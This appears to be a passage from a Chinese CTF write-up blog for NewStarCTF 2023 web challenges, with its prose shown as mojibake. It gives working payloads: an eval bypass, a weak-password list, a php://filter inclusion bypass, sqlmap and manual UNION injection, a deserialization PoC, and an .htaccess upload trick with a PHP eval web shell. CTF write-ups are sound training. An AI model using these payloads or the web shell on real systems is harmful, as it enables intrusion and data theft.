<p>å¾—åˆ°114514</p>
<p>![image-20231111204631008](NewStarCTF 2023/image-20231111204631008.png)</p>
<p>å¦‚å›¾æˆåŠŸçš„åˆ°phpinfoï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»å–äº†</p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ç¦æ­¢äº† system å‡½æ•°ï¼Œå¯ä»¥é‡‡ç”¨ php è‡ªå¸¦çš„å‡½æ•°æ¥è¾¾åˆ°ä¸€æ ·çš„æ•ˆæœï¼Œå…ˆä½¿ç”¨ scandir çœ‹ä¸€ä¸‹ç›®å½•ï¼Œæ³¨æ„ scandir æ˜¯ä¸ä¼šå›æ˜¾è¾“å‡ºçš„ï¼Œè®°å¾—åŠ ä¸Š var_dumpã€‚</p>
<p>![image-20231111204728698](NewStarCTF 2023/image-20231111204728698.png)</p>
<p>å‘ç°flag</p>
<pre><code class="hljs plaintext">password=114514&amp;e[v.a.l=var_dump(file_get_contents($_POST['a']));&amp;a=/flag</code></pre>
<p>![image-20231111204936443](NewStarCTF 2023/image-20231111204936443.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week1web-easylogin">WEEK1|WEB-EasyLogin</h2>
<p>è¿›å…¥ä¹‹åæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»è¿›å»çœ‹çœ‹ã€‚</p>
<p><code>Ctrl``C</code>å’Œ<code>Ctrl``D</code>å›åˆ° Shellï¼Œç®€å•çœ‹äº†ä¸‹ç›®å½•ç»“æ„æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿</p>
<p>åªå‘ŠçŸ¥äº†å«æœ‰ä¸€ä¸ª admin ç”¨æˆ·ï¼ŒæŒ‰æ–¹å‘ä¸Šé”®å¯ä»¥æŸ¥è¯¢Bashå†å²è®°å½•ã€‚</p>
<p>![image-20231111205334676](NewStarCTF 2023/image-20231111205334676.png)</p>
<p>å‘ç° Hintï¼Œå¾—çŸ¥ admin çš„å¯†ç ä¸ºå¼±å¯†ç åŠ ä¸Š<code>newstarnewstar2023</code>åå…¶ä¸­çš„ä¸€ä¸ªã€‚</p>
<p>æŒ‰<code>CtrlD</code>æˆ–è€…è¾“å…¥<code>exit</code>åå›è½¦å›åˆ°ç™»å½•ç•Œé¢ã€‚</p>
<p>è¯•ä¸€ä¸‹<code>newstar``newstar2023</code>ï¼Œæ²¡ç™»è¿›å»ï¼Œåœ¨ç½‘ä¸Šéšä¾¿æœå¼±å¯†ç ï¼Œè¯•ä¸€äº›å¸¸è§çš„ï¼Œè¯•å‡ºæ¥æ˜¯<code>qwe123</code>ï¼Œä¸åŒçš„é¶æœºå¯†ç å¯èƒ½ä¸ä¸€æ ·ã€‚</p>
<p>é¢˜ç›®é‡‡ç”¨çš„å¼±å¯†ç è¡¨ï¼š</p>
<pre><code class="hljs plaintext">123456789
password
newstar
newstar2023
123qwe
qwe123
qwertyuiop
asdfghjkl
zxcvbnm
admin123
admin888
111111
000000</code></pre>
<p>![image-20231111205827255](NewStarCTF 2023/image-20231111205827255.png)</p>
<p>è¿™é‡Œæˆ‘000000ç™»å½•è¿›å»ï¼ŒæŸ¥çœ‹bashå†å²å‘½ä»¤å‘ç°è®©æˆ‘ä»¬ä½¿ç”¨hint</p>
<p>![image-20231111210045998](NewStarCTF 2023/image-20231111210045998.png)</p>
<p>é‡æ–°ç™»å½•åæŠ“åŒ…ï¼ŒæŸ¥çœ‹httpå†å²è®°å½•å‘ç°ä¸Šå›¾ï¼Œæ‹¿åˆ°flag</p>
<h2 id="week2web-æ¸¸æˆé«˜æ‰‹">WEEK2|WEB-æ¸¸æˆé«˜æ‰‹</h2>
<p>![image-20231012214719990](NewStarCTF 2023/image-20231012214719990.png)</p>
<p>æ‰“å¼€ç•Œé¢è¿™è·ŸSHCTFçš„æŸä¸ªä¸€æ ·å•Šï¼Œä¸è¿‡ä¼¼ä¹æ›´å¤æ‚ä¸€ç‚¹ï¼Ÿæˆ‘ä»¬ç›´æ¥F12å®¡è®¡jsã€‚</p>
<p>è¿™é‡Œçœ‹åˆ°flagæœ‰åˆ†æ•°é™åˆ¶ï¼Œé‚£æˆ‘ä»¬å»å°±jsæ‰¾æ‰¾å…³é”®è¯ï¼Œä¸œæ‰¾è¥¿æ‰¾å‘ç°ä¸€å¤„å¯ç–‘ä»£ç </p>
<p>![image-20231012215035948](NewStarCTF 2023/image-20231012215035948.png)</p>
<p>è¿™é‡Œæ˜¾ç¤ºè¿™åˆ†æ•°è¾¾æ ‡çš„å¤„ç†æ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹åˆ°è¿™ä¼¼ä¹æ˜¯éœ€è¦bpæŠ“åŒ…ä¿®æ”¹å‘åŒ…æ–¹å¼çš„ï¼Œå—¯æˆ‘ä»¬ç›´æ¥å¼€æ</p>
<p>![image-20231012220006711](NewStarCTF 2023/image-20231012220006711.png)</p>
<p>è¿™é‡Œä¾æ®ä»£ç ä¿®æ”¹ä¸º POSTä¼ å‚æ–¹å¼ï¼Œæ›´æ”¹urlè·¯å¾„ï¼Œæ·»åŠ content-typeçš„æ•°æ®è§£ææ ¼å¼ï¼Œç„¶åæ·»åŠ æ­£ç¡®çš„jsonæ•°æ®æ ¼å¼å³å¯å¾—åˆ°flag</p>
<h2 id="week2web-include-0-0">WEEK2|WEB-include 0ã€‚0</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-comment">// FLAG in the flag.php</span>
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/base|rot/i'</span>,<span class="hljs-variable">$file</span>)){
    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"nope"</span>);
}
<span class="hljs-meta">?&gt;</span> nope</code></pre>
<p>ç®€å•çš„æ–‡ä»¶åŒ…å«é¢˜ç›®ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯çœ‹å¦‚ä½•ç»•è¿‡æ­£åˆ™çš„é—®é¢˜ï¼Œè¿™å°±è¦æ¬å‡ºå°ç¬”è®°äº†</p>
<h3 id="convertè½¬æ¢è¿‡æ»¤å™¨">convertè½¬æ¢è¿‡æ»¤å™¨</h3>
<p>å¸¸è§çš„convertè½¬æ¢è¿‡æ»¤å™¨æœ‰è¿™ä¸¤ç§ï¼š</p>
<pre><code class="hljs plaintext">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;
convert.quoted-printable-encode</code></pre>
<p>å¯¹äºç¬¬ä¸€ç§æ¥è¯´ï¼Œå®ƒé€šè¿‡ PHP çš„ iconv æ‰©å±•å®ç°ï¼Œè¯¥æ‰©å±•å¯ä»¥å¸®åŠ©å°†è¾“å…¥æ•°æ®ä»æŒ‡å®šçš„å­—ç¬¦ç¼–ç ï¼ˆ<input-encoding>ï¼‰è½¬æ¢ä¸ºå¦ä¸€ä¸ªå­—ç¬¦ç¼–ç ï¼ˆ<output-encoding>ï¼‰</output-encoding></input-encoding></p>
<p>å…¶ä¸­input-encodingã€output-encodingæ”¯æŒçš„ç¼–ç æ ¼å¼ä¸ºï¼š</p>
<pre><code class="hljs plaintext">UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
ISO-2022-JP
ISO-2022-JP-MS
CP932
CP51932
SJIS-macï¼ˆåˆ«åï¼šMacJapaneseï¼‰
SJIS-Mobile#DOCOMOï¼ˆåˆ«åï¼šSJIS-DOCOMOï¼‰
SJIS-Mobile#KDDIï¼ˆåˆ«åï¼šSJIS-KDDIï¼‰
SJIS-Mobile#SOFTBANKï¼ˆåˆ«åï¼šSJIS-SOFTBANKï¼‰
UTF-8-Mobile#DOCOMOï¼ˆåˆ«åï¼šUTF-8-DOCOMOï¼‰
UTF-8-Mobile#KDDI-A
UTF-8-Mobile#KDDI-Bï¼ˆåˆ«åï¼šUTF-8-KDDIï¼‰
UTF-8-Mobile#SOFTBANKï¼ˆåˆ«åï¼šUTF-8-SOFTBANKï¼‰
ISO-2022-JP-MOBILE#KDDIï¼ˆåˆ«åï¼šISO-2022-JP-KDDIï¼‰
JIS
JIS-ms
CP50220
CP50220raw
CP50221
CP50222
ISO-8859-1*
ISO-8859-2*
ISO-8859-3*
ISO-8859-4*
ISO-8859-5*
ISO-8859-6*
ISO-8859-7*
ISO-8859-8*
ISO-8859-9*
ISO-8859-10*
ISO-8859-13*
ISO-8859-14*
ISO-8859-15*
ISO-8859-16*
byte2be
byte2le
byte4be
byte4le
BASE64
HTML-ENTITIESï¼ˆåˆ«åï¼šHTMLï¼‰
7bit
8bit
EUC-CN*
CP936
GB18030
HZ
EUC-TW*
CP950
BIG-5*
EUC-KR*
UHCï¼ˆåˆ«åï¼šCP949ï¼‰
ISO-2022-KR
Windows-1251ï¼ˆåˆ«åï¼šCP1251ï¼‰
Windows-1252ï¼ˆåˆ«åï¼šCP1252ï¼‰
CP866ï¼ˆåˆ«åï¼šIBM866ï¼‰
KOI8-R*
KOI8-U*
ArmSCII-8ï¼ˆåˆ«åï¼šArmSCII8ï¼‰</code></pre>
<p>æœ¬é¢˜payloadå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.iconv.UTF-8.UTF-16/resource=check.php</span></code></pre>
<p>è¿™é‡Œä¹Ÿå°±æ˜¯æ›´æ¢æ­£ç¡®çš„è½¬æ¢å™¨å°±å¯ä»¥ç»•è¿‡äº†ï¼Œæ¯•ç«Ÿä»–è¿‡æ»¤çš„å¾ˆå°‘ï¼Œå°±ä¸¤ä¸ªå…³é”®è¯ï¼Œè¿™é‡Œå¤§å®¶ä¹Ÿå¯ä»¥æ”¾å…¥å­—å…¸çˆ†ç ´çœ‹çœ‹é‚£äº›èƒ½ç”¨ï¼Œæˆ‘è¿™é‡Œå°±æ˜¯ç›´æ¥é€‰æ‹©äº†æŸä¸ªå°è¯•çš„</p>
<p>![image-20231012220434736](NewStarCTF 2023/image-20231012220434736.png)</p>
<p>æˆåŠŸè¯»å–flag</p>
<h2 id="week2web-ez_sql">WEEK2|WEB-ez_sql</h2>
<h3 id="æ–¹æ³•ä¸€sqlmapä¸€æŠŠæ¢­">æ–¹æ³•ä¸€ï¼šsqlmapä¸€æŠŠæ¢­</h3>
<p>![image-20231014143835755](NewStarCTF 2023/image-20231014143835755.png)</p>
<p>æ‰“å¼€ç•Œé¢å¦‚ä¸‹ï¼Œäº‹åè¯¸è‘›äº®æ¥è¯´è¿™äº›è¿æ¥éƒ½å¯ä»¥è¿›è¡Œsqlæ³¨å…¥ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç¬¬äºŒæ¬¡è§£çš„æ—¶å€™æ‰è§£å‡ºæ¥ï¼Œç¬¬ä¸€æ¬¡è¿›è¡Œå¸¸è§„æ³¨å…¥å‘ç°æ²¡å•¥ç”¨ï¼Œäºæ˜¯ç¬¬äºŒæ¬¡çš„è¯é€‰æ‹©sqlmapç›´æ¥ä¸€æŠŠæ¢­ï¼Œæ¼”ç¤ºå¦‚ä¸‹</p>
<p>é¦–å…ˆæˆ‘ä»¬å…ˆåˆ¤æ–­è¯¥ç½‘å€æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p>
<pre><code class="hljs sql">sqlmap  <span class="hljs-operator">-</span>u "http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919"</code></pre>
<p>![image-20231014144323672](NewStarCTF 2023/image-20231014144323672.png)</p>
<p>å¦‚ä¸Šå›¾å¯çŸ¥æ•°æ®åº“ç±»å‹ä¸ºmysqlå¹¶ä¸”å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¹Ÿçˆ†äº†å‡ºæ¥ã€‚è¿™è¯´æ˜å­˜åœ¨sqlæ³¨å…¥ï¼Œæ¥ä¸‹æ¥ç›´æ¥é€‰æ‹©çˆ†æ•°æ®åº“ï¼ˆè¯­æ³•å¯è‡ªè¡Œç™¾åº¦ï¼‰</p>
<pre><code class="hljs sql">sqlmap  <span class="hljs-operator">-</span>u "http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919" <span class="hljs-comment">--dbs</span></code></pre>
<p>![image-20231014144535359](NewStarCTF 2023/image-20231014144535359.png)</p>
<p>å¯ä»¥çœ‹å‡ºå¯ä»¥æ•°æ®åº“ä¸ºctfï¼Œæ¥ä¸‹æ¥çˆ†è¡¨å</p>
<pre><code class="hljs sql">sqlmap  <span class="hljs-operator">-</span>u "http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919" <span class="hljs-comment">--tables -D ctf</span></code></pre>
<p>![image-20231014144657573](NewStarCTF 2023/image-20231014144657573.png)</p>
<p>å¯ä»¥çœ‹åˆ°flagæ‰€åœ¨è¡¨åï¼Œæ¥ä¸‹æ¥çˆ†åˆ—å</p>
<pre><code class="hljs sql">sqlmap  <span class="hljs-operator">-</span>u "http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919" <span class="hljs-comment">--columns -D ctf -T here_is_flag</span></code></pre>
<p>![image-20231014144810841](NewStarCTF 2023/image-20231014144810841.png)</p>
<p>æ¥ä¸‹æ¥æ˜¯çˆ†æ•°æ®</p>
<pre><code class="hljs sql">sqlmap  <span class="hljs-operator">-</span>u "http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919" <span class="hljs-comment">--dump -D ctf -T here_is_flag</span></code></pre>
<p>![image-20231014144854248](NewStarCTF 2023/image-20231014144854248.png)</p>
<p>æ‹¿åˆ°flag</p>
<h3 id="æ–¹æ³•äºŒæ‰‹å·¥æ³¨å…¥">æ–¹æ³•äºŒï¼šæ‰‹å·¥æ³¨å…¥</h3>
<p>æˆ‘å§‹ç»ˆè®¤ä¸ºåº”è¯¥æ˜¯æ‰‹å·¥ä¸ºä¸»ï¼Œå·¥å…·ä¸ºè¾…ï¼Œå› æ­¤æˆ‘åˆæ¥ç€å°è¯•ä¸€ä¸‹æ‰‹å·¥ï¼Œé¦–å…ˆæˆ‘ä»¬æ­£å¸¸åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p>
<p>![image-20231014144956525](NewStarCTF 2023/image-20231014144956525.png)</p>
<p>è¿™é‡Œæµ‹è¯•äº†å‡ æ¬¡å‘ç°éƒ½æ˜¯ä¸€ä¸ªnoçš„æç¤ºï¼Œæƒ³äº†æƒ³æˆ‘è®¤ä¸ºè¿™åº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œç„¶åæ— æ„é—´çœ‹åˆ°sqlmapçš„payloadå°è¯•çš„æœ‰å¤§å†™ï¼Œäºæ˜¯æˆ‘ä¹Ÿæ”¹æˆäº†å¤§å†™</p>
<p>![image-20231014145139951](NewStarCTF 2023/image-20231014145139951.png)</p>
<p>![image-20231014145205187](NewStarCTF 2023/image-20231014145205187.png)</p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘å°†andæ¢ä¸ºäº†å¤§å†™ä¹‹åå‘ç°é¡µé¢æ˜¯ä¸€ä¸ªæŠ¥é”™ï¼Œä¸€ä¸ªæ­£å¸¸ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥ï¼Œæ¥ç€ç»§ç»­å¸¸è§„æ€è·¯ã€‚</p>
<p>æŸ¥å­—æ®µæ•°</p>
<pre><code class="hljs php">?id=TMP0919<span class="hljs-string">' ORDER BY 5--+   //é¡µé¢æ­£å¸¸</span>
<span class="hljs-string">?id=TMP0919'</span> ORDER BY <span class="hljs-number">6</span>--+   <span class="hljs-comment">//é¡µé¢æŠ¥é”™</span></code></pre>
<p>![image-20231014145359706](NewStarCTF 2023/image-20231014145359706.png)</p>
<p>![image-20231014145408933](NewStarCTF 2023/image-20231014145408933.png)</p>
<p>è¯´æ˜å½“å‰è¡¨å­—æ®µæ•°ä¸º5</p>
<p>æ¥ç€æŸ¥å›æ˜¾ä½</p>
<pre><code class="hljs php">?id=-TMP0919<span class="hljs-string">' UNION SELECT 1, 2, 3, 4, 5--+ //è¿™é‡Œidå€¼å‰é¢åŠ äº†ä¸ªè´Ÿå·çš„åŸå› æ˜¯ï¼Œé˜²æ­¢idé‚£ä¸€å—å„¿å ç”¨å›æ˜¾ä½</span></code></pre>
<p>![image-20231014145435492](NewStarCTF 2023/image-20231014145435492.png)</p>
<p>å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°5ä¸ªå­—æ®µéƒ½å¯ä»¥å›æ˜¾ï¼Œé‚£æˆ‘ä»¬ç›´æ¥çˆ†åº“</p>
<p>![image-20231014145548447](NewStarCTF 2023/image-20231014145548447.png)</p>
<p>æ¥ç€æŸ¥çœ‹ctfä¸‹çš„è¡¨å</p>
<pre><code class="hljs PHP">?id=-TMP0919<span class="hljs-string">' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME), 3, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='</span>ctf<span class="hljs-string">'--+</span></code></pre>
<p>![image-20231014150008934](NewStarCTF 2023/image-20231014150008934.png)</p>
<p>æ¥ç€çˆ†å‡ºhere_is_flagä¸‹åˆ—å</p>
<pre><code class="hljs plaintext">?id=-TMP0919' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME), 3, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='ctf'--+</code></pre>
<p>![image-20231014150207165](NewStarCTF 2023/image-20231014150207165.png)</p>
<p>æ¥ç€çˆ†å‡ºflagåˆ—ä¸‹çš„æ•°æ®</p>
<pre><code class="hljs php">?id=-TMP0919<span class="hljs-string">' UNION SELECT 1, FLAG, 3, 4, 5 FROM here_is_flag--+</span></code></pre>
<p>![image-20231014150308760](NewStarCTF 2023/image-20231014150308760.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week2web-unserialize">WEEK2|WEB-Unserializeï¼Ÿ</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/cat|tac|more|tail|base/i"</span>, <span class="hljs-variable">$this</span>-&gt;cmd)){
            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);
        }
    }
}

@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'unser'</span>]);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>ç®€å•çš„ååºåˆ—åŒ–ï¼Œç›´æ¥å°†unserèµ‹å€¼ä¸ºevilå¯¹è±¡ï¼Œåœ¨å¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨destructè¿™ä¸ªææ„å‡½æ•°éšåä¼šæ‰§è¡Œsystemï¼Œè¿™é‡Œåªéœ€è¦ç»•è¿‡ä¸€ä¸‹å‘½ä»¤å³å¯ï¼Œpocå¦‚ä¸‹</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;
}
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();
<span class="hljs-variable">$poc</span>-&gt;cmd = <span class="hljs-string">'ls /'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>è¿™é‡Œå¯ä»¥å…ˆçœ‹ä¸€ä¸‹ç½‘ç«™phpç‰ˆæœ¬åœ¨7.1ä»¥ä¸Šï¼Œè¿™ä¸ªç‰ˆæœ¬ä»¥ä¸Šå¯¹ç±»å±æ€§ä¸æ•æ„Ÿï¼Œæˆ‘ä»¬ç›´æ¥å°†privateæ”¹ä¸ºpublicå³å¯</p>
<p>![image-20231014151027275](NewStarCTF 2023/image-20231014151027275.png)</p>
<p>![image-20231014151117793](NewStarCTF 2023/image-20231014151117793.png)</p>
<p>æ‰¾åˆ°flagï¼Œæ¥ä¸‹æ¥åœ¨ä¿®æ”¹pocå¦‚ä¸‹ï¼Œè¿™é‡Œè¿‡æ»¤è¡¥å…¨æˆ‘ä»¬é‡‡ç”¨nlè¯»å–å³å¯</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;
}
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();
<span class="hljs-variable">$poc</span>-&gt;cmd = <span class="hljs-string">'nl /th1s_1s_fffflllll4444aaaggggg'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>![image-20231014151222819](NewStarCTF 2023/image-20231014151222819.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week2web-upload-again">WEEK2|WEB-Upload again!</h2>
<p>![image-20231014151320133](NewStarCTF 2023/image-20231014151320133.png)</p>
<p>emmmå¾ˆéš¾è¯„çš„é¡µé¢ã€‚ã€‚ã€‚ã€‚ï¼Œè¯ä¸å¤šè¯´æˆ‘ä»¬ç›´æ¥ä¼ ä¸€ä¸‹phpçœ‹çœ‹</p>
<p>![image-20231014151500441](NewStarCTF 2023/image-20231014151500441.png)</p>
<p>å“Ÿå‘µï¼Œç›´æ¥ä¸Šbpï¼Œç°å°†åç¼€æ”¹ä¸ºjpgä¸Šä¼ æŠ“åŒ…çœ‹çœ‹</p>
<p>![image-20231014151659479](NewStarCTF 2023/image-20231014151659479.png)</p>
<p>å—¯ï¼ŒçŒœæµ‹è¿™é‡Œè¿‡æ»¤äº†æ–‡ä»¶åå¹¶ä¸”è¿˜æ£€æµ‹äº†æ–‡ä»¶å¤´</p>
<p>éšåå°è¯•è¿‡æ·»åŠ GIFå¤´æ— æœï¼Œäºæ˜¯å°è¯•ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ </p>
<p>![image-20231014152301398](NewStarCTF 2023/image-20231014152301398.png)</p>
<p>å¦‚ä¸Šå›¾ï¼Œçº¢è‰²å­—ä½“æ„æ€æ˜¯å°†åˆ«çš„åç¼€åæ–‡ä»¶å†…å®¹è§£æä¸ºphpç¨‹åº</p>
<pre><code class="hljs plaintext">AddType application/x-httpd-php .gif</code></pre>
<p>éšåçœ‹åˆ°æˆåŠŸä¸Šä¼ ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¸Šä¼ flag.gifçœ‹çœ‹ï¼Œä¸è¿‡åœ¨ç¬¬ä¸€æ¬¡ä¸Šä¼ çš„æ—¶å€™å¾—å°†phpæ ‡ç­¾è½¬æ¢ä¸€ä¸‹ï¼Œæ¯•ç«Ÿæ­¤ç½‘ç«™è¿‡æ»¤äº†phpæ ‡ç­¾ï¼Œå¦‚ä¸‹payload</p>
<pre><code class="hljs php">&lt;script language=<span class="hljs-string">"php"</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[sb]);&lt;/script&gt;</code></pre>
<p>![image-20231014152954676](NewStarCTF 2023/image-20231014152954676.png)</p>
<p>å‘ç°æˆåŠŸä¸Šä¼ </p>
<p>æˆ‘ä»¬ç›´æ¥è®¿é—®çœ‹çœ‹</p>
<p>![image-20231014153137082](NewStarCTF 2023/image-20231014153137082.png)</p>
<p>æˆåŠŸä¸Šä¼ ï¼Œå°è¯•èšå‰‘è¿æ¥</p>
<p>![image-20231014153245515](NewStarCTF 2023/image-20231014153245515.png)</p>
<p>![image-20231014153252173](NewStarCTF 2023/image-20231014153252173.png)</p>
<p>æ‰¾åˆ°flag</p>
<h2 id="week2web-rce">WEEK2|WEB-R!!C!!E!!</h2>
<p>è¿™é¢˜è€æ‡µé€¼äº†ï¼Œå½“æ—¶æ‰«ç›®å½•æ€»æ˜¯429é”™è¯¯ï¼ˆè¯´æ˜¯è®¿é—®é€Ÿåº¦è¿‡å¿«ï¼‰äºæ˜¯æˆ‘ä»¥ä¸ºä¸èƒ½æ‰«ç›®å½•ï¼Œæå¾—æˆ‘è§£ä¸å‡ºæ¥ï¼Œçœ‹äº†wpå‘ç°ç«Ÿç„¶èƒ½æ‰«ï¼Ÿï¼Ÿï¼Ÿæˆ‘æœäº†å•Šï¼Œäºæ˜¯æˆ‘åˆèµ¶ç´§å¯åŠ¨å»æ‰«äº†ä¸€ä¸‹ã€‚ã€‚ã€‚ä¾æ—§æ˜¯429æˆ‘èƒ¡äº†</p>
<p>æ— å¥ˆåªèƒ½ç›´æ¥ä¸Šgithackå·¥å…·çœ‹çœ‹ï¼Œæœç„¶è¿˜æ˜¯æåˆ°äº†</p>
<p>![image-20231015223844532](NewStarCTF 2023/image-20231015223844532.png)	æŸ¥çœ‹boog1pop.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-string">';'</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[^\W]+\((?R)?\)/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'star'</span>])) {  
    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'star'</span>]))
{        
        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'star'</span>]);    
    }
}</code></pre>
<p>ç¬¬ä¸€ä¸ªæ­£åˆ™å¯¹æäº¤çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼šä»»æ„å­—ç¬¦åŠ ä¸Šå¯é€‰çš„æ‹¬å·ï¼ˆå…è®¸åµŒå¥—ï¼‰æ›´æ¢ä¸ºç©ºï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç­‰äºåˆ†å·ï¼Œç»“åˆä¸‹é¢çš„ eval å¯ä»¥çŸ¥é“å°±æ˜¯æ— å‚æ•°å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>ç¬¬äºŒä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›å¸¸ç”¨çš„ç”¨äºæ— å‚æ•°å‘½ä»¤æ‰§è¡Œçš„ php æ–¹æ³•ï¼Œä½†è¿‡æ»¤ä¸å…¨ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼åŠŸèƒ½çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œæœ€ç»ˆå‘½ä»¤æ‰§è¡Œã€‚</p>
<p>è¿™é‡Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡è§PHPæ— å‚æ•°RCEï¼Œæµ…æµ…äº†è§£ä¸€ä¸‹</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment"># @Author: h1xa</span>

<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[^\W]+\((?R)?\)/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>])) {    
    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>]);
}
<span class="hljs-meta">?&gt;</span></code></pre>
